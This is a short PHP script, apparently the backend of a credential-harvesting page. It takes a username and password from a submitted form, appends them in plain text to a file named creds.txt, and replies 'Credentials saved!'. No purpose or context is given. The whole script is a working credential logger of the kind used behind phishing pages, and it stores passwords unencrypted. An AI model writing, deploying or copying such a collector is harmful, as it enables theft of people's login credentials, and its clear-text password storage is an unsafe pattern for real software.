<?php
$username = $_POST['username'];
$password = $_POST['password'];

$entry = "Username: $username | Password: $password\n";
file_put_contents("creds.txt", $entry, FILE_APPEND);
echo "Credentials saved!";
?>
